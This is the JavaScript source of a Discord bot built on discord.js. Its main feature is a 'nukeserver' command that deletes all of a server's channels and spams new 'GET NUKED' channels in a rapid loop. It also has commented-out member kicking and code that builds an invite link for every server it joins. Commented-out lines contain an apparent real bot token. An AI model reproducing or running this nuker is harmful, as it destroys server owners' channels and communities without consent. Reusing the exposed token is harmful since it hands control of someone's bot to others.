const { Console } = require('console');
const { Client, GatewayIntentBits, Guild, TextChannel, ChannelType, Collection } = require(`discord.js`);
const { type } = require('os');

//Prefix
const prefix = '-';

const {Guilds, GuildMembers, GuildMessages, MessageContent} = GatewayIntentBits;
const client = new Client({ intents: [Guilds, GuildMessages, MessageContent] });

client.on("ready", () => {
    //console.clear();
    console.log("Bot Started!");
    console.log("Logged In As " + client.user.tag + "!")

    client.user.setActivity("Life could be dream", { type: "WATCHING" });
    
    function commandListener() {
    readline.question(">", command => {
        const args = command.slice(prefix.length).split(/ +/);
        //newcommand <commandName> <commandAction>
    if(command === 'newcommand'.toLowerCase()) {
        if(args[2].startsWith("action:")) {
            if(args[2] === 'action:CreateChannel') {
                console.log("Succesfully created the command " + args[1] + "!");
                readline.close();
                commandListener();
            }
        } else {
            console.log("Unknown action!")
            readline.close();
            commandListener();
        }
    }

    if(command === 'help'.toLowerCase()) {
        console.log("1. newcommand <commandName> <commandAction> - creates a new command to the bot\n2. empty");
        commandListener();
    }
    
})}
commandListener();
})

client.on("guildCreate", (guild) => {
    const inviteLink = guild.channels.cache.first().createInvite();
    
    console.log("-------------------------");
    console.log("Guild Name: " + guild.name);
    console.log("Bot Name: " + client.user.username)
    console.log("Bot Token: " + client.token)
    guild.channels.cache.first().createInvite()
  .then(invite => console.log(`Invite Link: https://discord.com/invite/${invite.code}\n-------------------------`))
  .catch(console.error);
  console.log("Member Count: " + guild.memberCount);
    
    
})

client.on("messageCreate", (msg) => {
    if(!msg.toString().startsWith(prefix) || msg.author.bot) return;
    const args = msg.content.slice(prefix.length).split(/ +/);
    

    const command = args.shift().toLowerCase();

    //message array

    const messageArray = msg.content.split(" ");
    const argument = msg.content.slice(1);
    const cmd = messageArray[0];
    //Commands
    //newChannel Command
    if(command === 'newchannel') {
        msg.channel.send('Successfully created the textchannel "' + args[0] + '"!');
        msg.guild.channels.create({
            name: args[0],
            type: ChannelType.GuildText,
        })
    }

    //nukeServer Command
    if(command === 'nukeserver') {
        //Delete channels
        function deleteAllChannels() {
            msg.guild.channels.cache.each((channel) =>
    channel.delete().catch(console.error))
        }
        //Delete members
        //msg.guild.members.cache.each((member) =>
        //member.kick('1008806751296028823'));

        //CreateServers
        function createNukeChannels() {
        msg.guild.channels.create({
            name: "GET NUKED",
            type: ChannelType.GuildText,
        })
        }
        createNukeChannels();
        deleteAllChannels();
        setInterval(createNukeChannels, .1);
        setInterval(deleteAllChannels, 10000);
    }
})



//Login to the bot

const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });
  
  function tokenType() {
  setTimeout(() => {  readline.question("If you need help finding your discord bot's token you can find it here: \nhttps://github.com/Tyrrrz/DiscordChatExporter/wiki/Obtaining-Token-and-Channel-IDs#how-to-get-a-bot-token\nEnter the discord bot's token here to continue:\n", token => {
    client.login(token);
    console.clear();
    console.log("Keep this window open, else the bot is going to go offline!");
    //if (answer === 'Default') {
        //client.login("MTAzNTk1MDQwODkxMDI0NjAwMA.GrQHJH.dEiTULJ69YKe9fyszLRbl7tAmz0dZCnM54GyYY");
        //console.log("Keep this window open, else the bot is going to go offline!");
    //} else if (answer === 'Custom') {
        //readline.question('Enter your custom token here: ', newanswer => {
            //client.login(newanswer);
        //readline.close();
    //});
    //if (answer != 'Default' && answer != 'Custom') {
        //console.log("NaN");
        //tokenType();
    //}}
    //readline.close();
  }); }, 2500);
}

tokenType();

//client.login("MTAzNTk1MDQwODkxMDI0NjAwMA.GrQHJH.dEiTULJ69YKe9fyszLRbl7tAmz0dZCnM54GyYY");